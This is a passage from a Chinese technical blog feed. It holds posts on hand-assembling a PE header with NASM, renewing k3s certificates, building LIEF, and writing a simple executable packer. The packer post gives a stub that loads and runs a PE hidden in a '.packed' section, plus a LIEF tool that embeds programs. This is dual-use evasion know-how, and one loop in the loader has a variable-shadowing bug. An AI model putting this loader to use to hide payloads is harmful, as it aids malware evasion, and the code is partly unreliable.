的时候就没卵用。\nGLOBAL，导出符号，和EXTERN的应用场景差不多。熟悉C的码农应该能理解。\n1.7 输出格式 几个值得关注的输出格式。\n-f win32 就是输出成 win32 对象文件 .obj，之后可以用 gcc 或者 link.exe 之类的东西链接。\n-f bin 输出成二进制文件，你写了啥就输出啥，nasm 就是个翻译官。.COM和.SYS都是纯二进制格式的，你要是写这些可能有用。还有操作系统引导程序之类的纯二进制程序，不需要别的什么文件格式的情况。\n-f elf 你要是写 linux 下的程序就有用。\n1.8 总结 基本就是这样，更多东西就现查现用好吧。善用谷歌。\n0x02 简单汇编程序 先写一个简单的汇编程序，不直接产生可执行文件，而是需要链接器进一步链接。例子需要安装 MinGW。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  section .data global HelloWorld HelloWorld: db \u0026#39;hello world\u0026#39;,0 ; 定义一个字符串常量，用于输出  section .text global _main ; _main 就是 C 的 main, 用于让链接器识别出入口点，生成命令行程序  extern _printf ; _printf 就是 C 的 printf, 用于输出 hello world  _main: push ebp ; 其实我们自己写就不用啰嗦 push ebp/mov ebp,esp 了, 心里有底就行  mov ebp, esp push HelloWorld ; 压入字符串常量的地址做参数  call _printf ; 调用 printf 输出  add esp, 4 ; 根据 cdecl 约定，完成平栈  pop ebp ; 要返回一个值的话可以再加一行 mov eax, 0 等同于 return 0  retn ; 完事   编译命令，要安装 MinGW 才有 gcc 可以用。或者其他链接器也可以，GoLink 好像就行，但是我没用过。\n1 2  nasm main.asm -f win32 -o main.o gcc main.o -o main.exe   生成的代码放进调试器看看。\n可以看到我们的汇编代码忠实地出现在调试器里。\n这就是 nasm 的简单用法了，想要拿汇编写一点简单的验证代码是没问题的，也可以手写汇编函数，再链接到 C/C++ 代码里。当然，写 C/C++ 的大佬大概也知道 Visual C++ 支持内嵌汇编，__asm {} 就行，这也算一种选项。\n0x03 生成二进制代码 使用 nasm -f bin 可以直接从汇编代码生成二进制文件，也就是没有链接这一步。\n当然，没有链接这一步（或者说链接相关信息不由 nasm 管理），global 和 extern 都没有意义，在 -f bin 时汇编器会直接提示错误，不能使用。但相对的，因为 nasm 没自动生成更多信息，我们也对汇编结果有了更强的控制力，也要负担更多责任。\n3.1 生成 DOS 文件头 PE 文件格式不再赘述，参考微软的 PE Format 文档，或者维基百科的 PE 格式图即可。\n先从生成 PE 文件的文件头开始，填充可执行文件的必要信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  BITS 32 ; 由编译器生成的 DOS 文件头其实包含了一段输出 This program cannot be run in DOS mode 的代码 ; 我们不需要，这里直接忽略。 dos_header: .magic dw \u0026#34;MZ\u0026#34; ; dw 伪指令会放置一个双字节 word, 也就是操作数 MZ  .cblp dw 90h ; 90h 就是 0x90  .cp dw 3 .crlc dw 0 .cparhdr dw 4 .minalloc dw 0 .maxalloc dw -1 .ss dw 0 .sp dw 0B8h .csum dw 0 .ip dw 0 .cs dw 0 .lfarlc dw 40h .ovno dw 0 .res times 4 dw 0 ; 伪指令 times 重复 n 次，放置 4 个双字节 word ，值为 0  .oemid dw 0 .oeminfo dw 0 .res2 times 10 dw 0 .lfanew dd .next ; 紧随其后的就是 NT 文件头了，所以 lfanew 直接指向自己末尾后  .next:   关于链接器自动生成的文件头，可以参考这篇文章 a closer look at portable executable MS-DOS stub 。\n反正咱无脑复制了。\n3.2 生成 PE 文件头 生成 PE 文件头之前我们要预先考虑几个要素。\n  文件如何对齐？\n对齐到 0x400，大部分内容都可以在一个 0x400 里填写完，计算量比较少。\n  Section 如何对齐？\n对齐到 0x1000，同样是简化计算。\n  需要几个 Section？\n一个 .text 就足够了。\n  其余文件头内容，出于简单考虑，包括重定位和 IAT 在内的大部分东西都留空，仅仅写一个什么效果都没有的可执行文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  nt_header: pe_signature: .sig dd \u0026#34;PE\u0026#34; ; 魔术标识, dd 伪指令填充一个 DWORD, 结果是 PE\\0\\0  file_header: .machine dw 0x014c ; 支持 Intel I386  .numberofsections dw 0x01 ; 本文件包含一个 Section  .timedatestamp dd 0 .pointertosymboltable dd 0 .numberofsymbols dd 0 .optheadersize dw $OPT_HEADER_SIZE ; opt_header_size 会在稍后的 optional_header 末尾计算得到  .characteristics dw 0x102 ; 声明本文件是一个32位Windows可执行程序  optional_header: .magic dw 0x10b .linker_version db 8,0 .sizeof_code dd 1000h ; 共包含 0x1000 字节的代码段  .sizeof_initialized_data dd 0 .sizeof_uninitialized_data dd 0 .addressof_entrypoint dd 1000h ; 入口点 RVA  .baseof_code dd 1000h ; 代码段 RVA  .baseof_data dd 0h ; 数据段 RVA, 没有数据段就留空了  .image_base dd 4000000h ; 镜像基址 0x04000000, 后面是 6 个 0  .section_alignment dd 1000h ; section 对齐到 1000h  .file_alignment dd 400h ; 文件对齐到 400h  .os_version dw 4,0 .img_version dw 0,0 .subsystem_version dw 4,0 .win32_ver_value dd 0 .sizeof_img dd 2000h ; 请求的镜像总大小，文件头到代码段起点共 1000h, 代码段 1000h, 共计 2000h  .sizeof_headers dd 400h ; 文件头大小对齐到了 400h, 我们知道文件头肯定不足 400h, 所以 sizeof_headers 直接填 400h 就行  .checksum dd 0 .subsystem dw 2 .dll_characteristics dw 0x400 ; 不支持 SEH, 不开启 ASLR  .sizeof_stack_reserved dd 0x100000 .sizeof_stack_commit dd 0x1000 .sizeof_heap_reserved dd 0x100000 .sizeof_heap_commit dd 0x1000 .loeader_flags dd 0 .numberof_rva_and_sizes dd 10h ; 后续有 16 个 Data Directories  data_directories: times 10h dd 0, 0 ; 所有的 data directories 填充 0  ; 通过伪指令 equ ，给 $OPT_HEADER_SIZE 赋值为 (当前地址 - optional_header标签) ; 也就是整个 optional_header 的大小 $OPT_HEADER_SIZE equ $ - optional_header section_table: .text: db \u0026#34;.text\u0026#34;, 0, 0, 0 ; section name  ; 注意对齐到了 8 字节，不足部分 0 填充, 不能超出  dd 1000h ; virtual size  ; Section 使用的内存大小  dd 1000h ; virtual address  ; Section 的起始点 RVA  dd 400h ; sizeof raw data  ; 我们知道对齐到了 400h 且代码肯定比这少, 所以 raw data 必然有 400h 大小  dd code ; pointer to raw data  ; 用 label 告诉汇编器 raw data 的偏移  dd 0 ; pointer to relocations  dd 0 ; pointer to linenum  dw 0 ; number of relocations  dw 0 ; number of linenum  dd 0x60000020 ; characteristics  ; 含义是：代码段 - 可读  align 400h, db 0 ; align 伪指令，不足的部分填充0, 对齐到 400h ; 相对文件头到这里, 肯定是不足 400h 的, align 伪指令会填充到满 400h 为止。 ; 这样一来, 整个文件头大小, 正好就是 400h   3.2 编写汇编代码 文件头定义完成后，就可以开始写汇编代码了。正常这时候还要处理导入表，但我们跳过了。\n1 2 3 4 5 6  code: .start: xor eax, eax retn align 400h, db 0 ; 同样，再次对齐到 400h ，把代码段的剩余部分填充成 0   到这里，整个 PE 文件的内容就填写完毕了。\n文件头的绝大多数字段并不是我们关注的对象，计算偏移和对齐是最蛋疼的。\n3.3 关于对齐的坑  There are additional restrictions on image files if the SectionAlignment value in the optional header is less than the page size of the architecture. For such files, the location of section data in the file must match its location in memory when the image is loaded, so that the physical offset for section data is the same as the RVA.\n 微软文档里指出，在 Section 对齐的大小小于体系结构指定的页大小（4K）的时候，会有个额外限制，要求 Section 数据在文件中的偏移 必须 对应在内存中的 RVA 。也就是说，如果 Section 对齐为 1 字节，VirtualAddress 指定为 1000h，那 Section 数据必须存放在文件的 1000h 偏移处，否则生成的可执行文件会出现“不是有效的Win32应用程序”错误。\n3.4 其他坑 建议不要参考单独的某几篇文章，多找些相关的文章博客和文档，互相对照着看。PE格式错误不会有具体的提示，我也没找到什么好用的工具去检查到底哪儿有错，只能建议多用用 CFF Explorer 和 lief、pefile 这些能检查文件格式的库了，要是这些都不行那就看看16进制编辑器什么的吧，比如 HexWorkshop。IDA 在这儿没啥用。\n另外我还发现1字节对齐的时候，x32dbg 调试会看不到汇编代码，在内存布局里进入自己的PE文件后只能看到PE头，但没有反汇编。不过调试器还是可以正常单步调试和查看寄存器。\n3.5 编译 上面的汇编代码用 nasm 即可编译，不需要其他编译或链接工具了。\n1  nasm pe.asm -f bin -o pe.exe   也可以放进调试器看看。\n可以看到，代码段正确出现在 4001000h 这个地址上（基址+1000h），内容也符合我们写的汇编代码。\n在内存布局窗口也能看到。\n总结 这是个对 PE 文件格式有所了解后的一个简单应用，原先是只会拿其他编程语言去读 PE 文件头的内容，现在学会了用汇编器去写一个简单的 PE 文件。之所以是汇编器去写，而不是拿 C/C++/Python 去写，还是因为我菜而且懒。好了跳过关于我菜的话题吧。\n参考文档（不分先后）：\n http://blog.marcinchwedczuk.pl/a-closer-look-at-portable-executable-msdos-stub https://docs.microsoft.com/en-us/windows/win32/debug/pe-format https://reverseengineering.stackexchange.com/questions/11758/how-do-you-calculate-address-start-size-of-pe-section-like-rdata-data http://www.phreedom.org/research/tinype/ https://stackoverflow.com/questions/17456372/create-and-use-sections-for-pe-file-in-assembly-nasm https://bitcodersblog.wordpress.com/2017/05/10/win32-in-nasm-part-1/  大部分代码其实是来自 tinype，被我调来调去改了很多。自己动手折腾一遍远比走马观花看一遍收获更多，有些实践问题不跟着抄一次改一改是不会发现的。有言道“实践出真知”，虽然说现在有些沙雕把生活经验当成真理导致一帮人捧书本一帮人捧经验，搞得啥事情都非黑即白\u0026hellip;把伟人的话当成互相攻讦的武器。\n淦，好好的学习，结果总结的时候越想越气。\n果然，“人类的悲欢并不相通，我只觉得他们吵闹。”\n","date":"2021-10-13T11:05:00+08:00","permalink":"https://nnnewb.github.io/blog/p/hand-write-pe-file-with-nasm-assembly/","title":"nasm汇编手写个PE可执行文件"},{"content":"前言 今天上内网服务器看了眼，准备调试下新代码，结果发现报错 You must logged in to the server (unauthorized) 。翻了半天的 KUBECONFIG 配置，发现啥也没错。换成 /etc/rancher/k3s/k3s.yaml 也不行。于是查了下 journalctl -r -u k3s ，发现日志 x509: certificate has expired or not yet valid: current time ... ，这就明确了是证书过期了。\n于是又找了一圈如何给k3s更新证书，搜 how to renew client-ca-file 查出来的方法不是 kubeadm 就是改时间、换证书，总之\u0026hellip;麻烦，而且搜出来的文章可操作性都有点差，真要实践出真知也不能放公司的机器上，搞出点问题还得劝自己心平气和磨上一整天去解决。\n于是终于找到个看起来能行的办法：重启。\n操作 这个办法可操作性很强——反正情况不会变得更差了。因为办公室的服务器并不能保证24小时不断电，有时候白天上班机器是关机的，重启k3s无论如何不会导致问题变得更差——就算放着不管，过两天说不定也会断电重启下。\n确认没人用服务之后直接上手。\n1  sudo systemctl restart k3s   等待重启完成，测试下新的 k3s.yaml 能不能正常用。\n1 2  export KUBECONFIG=/etc/rancher/k3s/k3s.yaml kubectl cluster-info   1 2 3 4 5  Kubernetes control plane is running at https://192.168.2.175:6443 CoreDNS is running at https://192.168.2.175:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy Metrics-server is running at https://192.168.2.175:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy To further debug and diagnose cluster problems, use \u0026#39;kubectl cluster-info dump\u0026#39;.   其他 get nodes 之类的命令也顺利完成，剩下就是把新的客户端证书合并到个人的配置里了（对，并不是直接用 /etc/rancher/k3s/k3s.yaml，我知道有人会这么用）。办法也简单，vim /etc/rancher/k3s/k3s.yaml，把里面的 users 键下，default 用户的信息复制出来，粘贴到个人的 ~/.kube/config 相应位置就好。以前复制过的话，就覆盖掉。\n总结 没啥好总结的，重启大法解决一切问题。不过手动轮换证书的办法也得记录一下，这里留相关的摘要链接。\n kubernetes.io/使用 kubeadm 进行证书管理 ibm.com/renewing kubernetes cluster certificates forum.rancher.com/how to renew cert manually?  比较好奇的有多个master节点的集群，能通过逐个重启master节点来实现自动更新证书吗？\n","date":"2021-10-11T13:58:00+08:00","permalink":"https://nnnewb.github.io/blog/p/k3s-renew-client-ca-file-the-lazy-way/","title":"k3s更新客户端证书的偷懒方法"},{"content":"前言 惯例得有个前言。\nLIEF是一个二进制文件分析和操作库，官方推荐的是 Python 版本，确实更好用，就是类型的问题有点多，而且没附送 .pyi 导致不大好写。而C++版本就没这问题，C++版本有自己的问题=，=\n一个是官方提供下载的SDK是静态链接的，用到SDK的程序必须指定 /MT 不然编译器就会抱怨运行库不匹配。虽然看issue里已经有人解决了（-DLIEF_USE_CRT_{DEBUG,RELEASE}=MD/MT），但CI还是老样子，反正直接下载的SDK用起来就蛋疼，vcpkg 全都是 /MD 链接的，没法配合用。\n更别提 MinGW 了，就没官方的SDK。\n以上就是问题，解决问题的最简单办法就是自己编译了。\n0x01 Visual C++ 工具链 msbuild 代码下载下来之后，用 CMake 去编译。下面的命令都是 Powershell 下的，注意折行用的是反引号 backquote，就是波浪号那个键，和 bash 用 反斜杠不一样。直接复制到命令行是跑不起来的。\n1 2 3 4 5 6  cmake .. -G \u0026#34;Visual Studio 2019\u0026#34; # Generator，你的工具链，可以用 cmake --help 来看看有哪些可用的 -A Win32 # 选择 Visual C++ 工具链的情况下可以用 -A Win32 选择编译32位代码，或者 Win64 -DCMAKE_BUILD_TYPE=Debug # 常用的 Debug/Release/RelWithDebInfo -DLIEF_PYTHON_API=off # 不编译 Python 模块，这样就不用装 Python 了 -DLIEF_USE_CRT_DEBUG=MD # 使用 /MD 链接 msvcrt.dll 而不是 libcmt   这儿有个坑，用 Visual Studio 这个 Generator 的时候，虽然指定了 CMAKE_BUILD_TYPE，但实际没什么卵用，还得在编译的时候给参数 --config Debug 才会真的按 Debug 编译。\n然后是编译命令：\n1  cmake --build . --config Debug --target LIB_LIEF   默认用微软的 msbuild 会花很长时间去编译，不嫌麻烦的话可以用 Ninja。\n编译完还不能用，还得先“安装”到一个目录里。\n1  cmake --install . --config Debug --prefix LIEF-msvc-debug   这样就会把必要的文件给复制到 LIEF-msvc-debug 这个文件夹里了，参考 LIEF 官方的集成文档，把 LIEF_DIR 设置成这个文件夹的路径就可以用啦。\n0x02 Visual C++ 工具链 ninja 使用 CMake + Ninja 的情况下没法用 -A 去控制编译32位还是64位了，你得先装好 Visual C++ 构建工具，然后打开开发者命令提示符。\n比如想编译32位的就选 x86 native tool command prompt ，在这个命令提示符里用 cmake 构建。\n1 2 3  cmake .. -G Ninja -DCMAKE_BUILD_TYPE=Debug -DLIEF_PYTHON_API=off -DLIEF_USE_CRT_DEBUG=MD cmake --build . --target LIB_LIEF cmake --install . --prefix LIEF-msvc-debug   其他和直接用 msvc 没啥区别。\n0x03 MinGW 工具链 makefile MinGW 工具链其实和 msvc 差不太大。先装 MinGW，推荐 msys2，msys2装好后跑命令 pacman -Sy mingw-w64-i686-toolchain 就能装上32位的编译工具链了，包括了 gcc、g++、mingw32-make 这些必要的程序。\n完事后把 MinGW 工具链加到 PATH 里。一般来说，假如你把 msys2 装到 C:\\msys64 下的话，那要加的路径就是 C:\\msys64\\mingw32\\bin，自己看看要用的 gcc 放在哪儿呗。\n另外 LIEF_USE_CRT_DEBUG 这变量也用不到了，MD还是MT 这是专供 MSVC 的选择题，MinGW 不管这个。\n接着就可以用 CMake 了。\n1 2 3  cmake .. -G \u0026#34;MinGW Makefiles\u0026#34; -DCMAKE_BUILD_TYPE=Debug -DLIEF_PYTHON_API=off \u0026#39;-DCMAKE_C_FLAGS:STRING=\u0026#34;-m32\u0026#34;\u0026#39; \u0026#39;-DCMAKE_CXX_FLAGS:STRING=\u0026#34;-m32\u0026#34;\u0026#39; cmake --build . --target LIB_LIEF cmake --install . --prefix LIEF-mingw32-debug   不用担心 CMake 选错工具链，用 MinGW Makefiles 的情况下会优先考虑 GCC 的。不过还有个老问题：怎么选32位还是64位。答案是设置下 C_FLAGS 和 CXX_FLAGS 这两个特殊变量，让编译器加上 -m32 这个参数，编译出来的就是32位代码了。\n0x04 MinGW 工具链 Ninja 和 MinGW Makefiles 差不太多，但是 Ninja 没那么聪明，不知道要用什么编译器，得手动指定。\n1 2 3  cmake .. -G Ninja -DCMAKE_BUILD_TYPE=Debug -DLIEF_PYTHON_API=off -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++ \u0026#39;-DCMAKE_C_FLAGS:STRING=\u0026#34;-m32\u0026#34;\u0026#39; \u0026#39;-DCMAKE_CXX_FLAGS:STRING=\u0026#34;-m32\u0026#34;\u0026#39; cmake --build . --target LIB_LIEF cmake --install . --prefix LIEF-mingw32-debug   配置阶段多出来两个参数，-DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++，目的就是告诉 CMake 放机灵点，用 gcc/g++ 编译器，别瞎整。\n总结 也就这么回事吧。\n","date":"2021-10-08T16:25:00+08:00","permalink":"https://nnnewb.github.io/blog/p/how-to-compile-lief-on-windows/","title":"编译LIEF的各种姿势"},{"content":"前言 对 Windows 程序的加载和运行过程有了基本了解后，手动加载并运行一个PE文件并不成问题。加壳仅仅是在这上面更进一步：把加载程序和被加载的程序合并成一个文件。\n这么说可能有点太简单化，大部分的工作其实就在这儿：如何处理被加载的程序？压缩？加密？混淆？加载器（或者叫壳程序）如何反调试？\n这里先写一个简单的加壳机，仅仅是把被加载的PE文件作为一个 Section，添加到壳程序里，让壳程序直接从这个 Section 加载并运行。其他花里胡哨的操作都先不整，仅作为证明工作原理的案例。\n0x01 壳程序 1.1 思路 和加载一个PE文件不同，既然被加载的程序就在 Section 里，那需要做的只有定位到 Section，然后把 Section 内容当读取进内存的 PE 文件内容处理就好了。\n壳程序应该尽量保持轻量，不在原始程序上添加太多东西（加完壳大小翻一倍还多了一堆DLL依赖那谁受得了啊），所以很多标准C库的函数也不能用了，像是memcpy、strcmp 都要自己简单实现一个。\n1.2 壳实现 绝大部分内容和之前文章中的 load_PE 一致，入口点修改为 _start，需要注意。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208  #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winnt.h\u0026gt; void *load_PE(char *PE_data); void fix_iat(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers); void fix_base_reloc(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers); int mystrcmp(const char *str1, const char *str2); void mymemcpy(char *dest, const char *src, size_t length); int _start(void) { char *unpacker_VA = (char *)GetModuleHandleA(NULL); IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)unpacker_VA; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(((char *)unpacker_VA) + p_DOS_header-\u0026gt;e_lfanew); IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); char *packed = NULL; char packed_section_name[] = \u0026#34;.packed\u0026#34;; for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { if (mystrcmp(sections[i].Name, packed_section_name) == 0) { packed = unpacker_VA + sections[i].VirtualAddress; break; } } if (packed != NULL) { void (*entrypoint)(void) = (void (*)(void))load_PE(packed); entrypoint(); } return 0; } void *load_PE(char *PE_data) { IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders; // allocate memory  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc  char *p_image_base = (char *)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (p_image_base == NULL) { return NULL; } // copy PE headers in memory  mymemcpy(p_image_base, PE_data, size_of_headers); // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  mymemcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { for (size_t i = 0; i \u0026lt; sections[i].Misc.VirtualSize; i++) { dest[i] = 0; } } } fix_iat(p_image_base, p_NT_headers); fix_base_reloc(p_image_base, p_NT_headers); // Set permission for the PE header to read only  DWORD oldProtect; VirtualProtect(p_image_base, p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, \u0026amp;oldProtect); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; ++i) { char *dest = p_image_base + sections[i].VirtualAddress; DWORD s_perm = sections[i].Characteristics; DWORD v_perm = 0; // flags are not the same between virtal protect and the section header  if (s_perm \u0026amp; IMAGE_SCN_MEM_EXECUTE) { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; } else { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; } VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, \u0026amp;oldProtect); } return (void *)(p_image_base + entry_point_RVA); } void fix_iat(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // load the address of the import descriptors array  IMAGE_IMPORT_DESCRIPTOR *import_descriptors = (IMAGE_IMPORT_DESCRIPTOR *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // this array is null terminated  for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) { // Get the name of the dll, and import it  char *module_name = p_image_base + import_descriptors[i].Name; HMODULE import_module = LoadLibraryA(module_name); if (import_module == NULL) { // panic!  ExitProcess(255); } // the lookup table points to function names or ordinals =\u0026gt; it is the IDT  IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].OriginalFirstThunk); // the address table is a copy of the lookup table at first  // but we put the addresses of the loaded function inside =\u0026gt; that\u0026#39;s the IAT  IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].FirstThunk); // null terminated array, again  for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) { void *function_handle = NULL; // Check the lookup table for the adresse of the function name to import  DWORD lookup_addr = lookup_table[i].u1.AddressOfData; if ((lookup_addr \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1  // import by name : get the IMAGE_IMPORT_BY_NAME struct  IMAGE_IMPORT_BY_NAME *image_import = (IMAGE_IMPORT_BY_NAME *)(p_image_base + lookup_addr); // this struct points to the ASCII function name  char *funct_name = (char *)\u0026amp;(image_import-\u0026gt;Name); // get that function address from it\u0026#39;s module and name  function_handle = (void *)GetProcAddress(import_module, funct_name); } else { // import by ordinal, directly  function_handle = (void *)GetProcAddress(import_module, (LPSTR)lookup_addr); } if (function_handle == NULL) { ExitProcess(255); } // change the IAT, and put the function address inside.  address_table[i].u1.Function = (DWORD)function_handle; } } } void fix_base_reloc(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // this is how much we shifted the ImageBase  DWORD delta_VA_reloc = ((DWORD)p_image_base) - p_NT_headers-\u0026gt;OptionalHeader.ImageBase; // if there is a relocation table, and we actually shitfted the ImageBase  if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 \u0026amp;\u0026amp; delta_VA_reloc != 0) { // calculate the relocation table address  IMAGE_BASE_RELOCATION *p_reloc = (IMAGE_BASE_RELOCATION *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); // once again, a null terminated array  while (p_reloc-\u0026gt;VirtualAddress != 0) { // how any relocation in this block  // ie the total size, minus the size of the \u0026#34;header\u0026#34;, divided by 2 (those are words, so 2 bytes for each)  DWORD size = (p_reloc-\u0026gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; // the first relocation element in the block, right after the header (using pointer arithmetic again)  WORD *fixups = (WORD *)(p_reloc + 1); for (size_t i = 0; i \u0026lt; size; ++i) { // type is the first 4 bits of the relocation word  int type = fixups[i] \u0026gt;\u0026gt; 12; // offset is the last 12 bits  int offset = fixups[i] \u0026amp; 0x0fff; // this is the address we are going to change  DWORD *change_addr = (DWORD *)(p_image_base + p_reloc-\u0026gt;VirtualAddress + offset); // there is only one type used that needs to make a change  switch (type) { case IMAGE_REL_BASED_HIGHLOW: *change_addr += delta_VA_reloc; break; default: break; } } // switch to the next relocation block, based on the size  p_reloc = (IMAGE_BASE_RELOCATION *)(((DWORD)p_reloc) + p_reloc-\u0026gt;SizeOfBlock); } } } int mystrcmp(const char *str1, const char *str2) { while (*str1 == *str2 \u0026amp;\u0026amp; *str1 != 0) { str1++; str2++; } if (*str1 == 0 \u0026amp;\u0026amp; *str2 == 0) { return 0; } return -1; } void mymemcpy(char *dest, const char *src, size_t length) { for (size_t i = 0; i \u0026lt; length; i++) { dest[i] = src[i]; } }   构建参数（CMAKE）\n1 2 3  add_executable(loader_2 WIN32 loader_2.c)target_compile_options(loader_2 PRIVATE /GS-)target_link_options(loader_2 PRIVATE /NODEFAULTLIB /ENTRY:_start)  参数/GS-是为了避免在/NODEFAULTLIB下出现一些缓存区安全检查代码链接错误。参考文档。\n0x02 加壳机 相信已经发现了，上文并没有提到怎么把程序嵌入壳程序里。这是因为加壳并不是在壳程序编译时直接把文件嵌进去=，=虽然理论上来说也可以，但这里不讨论了。仅仅看加壳机加壳的场景吧。\n2.1 加壳机原理 加壳机做的事情包括：\n 在 section table 里添加 section  根据 section table 和 file_alignment 决定如何分配空间 根据 section_alignment 计算 virtual size 根据上一个 section 大小和位置计算 virtual address 填充 pointer_to_raw_data 和 size_of_raw_data 设置合适的 characteristics   计算修改 number_of_sections 计算修改 size_of_image 计算修改 size_of_headers  反正看起来就很麻烦，不过幸好操作 PE 文件的库不少，GitHub 搜一搜就有。这里用 LIEF 这个库，操作蛮简单的。\n2.2 源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;LIEF/LIEF.hpp\u0026gt;#include \u0026lt;vector\u0026gt; std::vector\u0026lt;uint8_t\u0026gt; read_file(const std::string \u0026amp;path) { auto h = CreateFile(path.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr); DWORD readbyte = 0; auto filesize = GetFileSize(h, nullptr); auto content = std::vector\u0026lt;uint8_t\u0026gt;(); content.resize(filesize, 0); if (!ReadFile(h, content.data(), filesize, \u0026amp;readbyte, nullptr)) { abort(); } if (readbyte != filesize) { abort(); } CloseHandle(h); return content; } int main(int argc, const char *argv[]) { if (argc \u0026lt; 3) { printf(\u0026#34;loader and program path are required\u0026#34;); return -1; } auto loader_path = argv[1]; auto program_path = argv[2]; auto loader_binary = LIEF::PE::Parser::parse(loader_path); // LIEF 帮我们做了偏移计算之类的工作，这里就只用点逻辑，非常得银杏。  auto program_content = read_file(program_path); auto packed_section = LIEF::PE::Section(\u0026#34;.packed\u0026#34;); // 新建 section  packed_section.content(program_content); // 把被加载程序的内容当成 section 内容  loader_binary-\u0026gt;add_section(packed_section, LIEF::PE::PE_SECTION_TYPES::DATA); // 把 section 添加到壳程序里  // 用 lief 实现把修改后的壳程序写入硬盘  auto builder = LIEF::PE::Builder::Builder(loader_binary.get()); builder.build(); builder.write(\u0026#34;packed.exe\u0026#34;); return 0; }   编译指令（CMAKE）参考 LIEF 文档。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # Custom path to the LIEF install directory set(LIEF_DIR CACHE PATH ${CMAKE_INSTALL_PREFIX})# Directory to \u0026#39;FindLIEF.cmake\u0026#39; list(APPEND CMAKE_MODULE_PATH ${LIEF_DIR}/share/LIEF/cmake)# include \u0026#39;FindLIEF.cmake\u0026#39; include(FindLIEF)# Find LIEF find_package(LIEF REQUIRED COMPONENTS STATIC) # COMPONENTS: 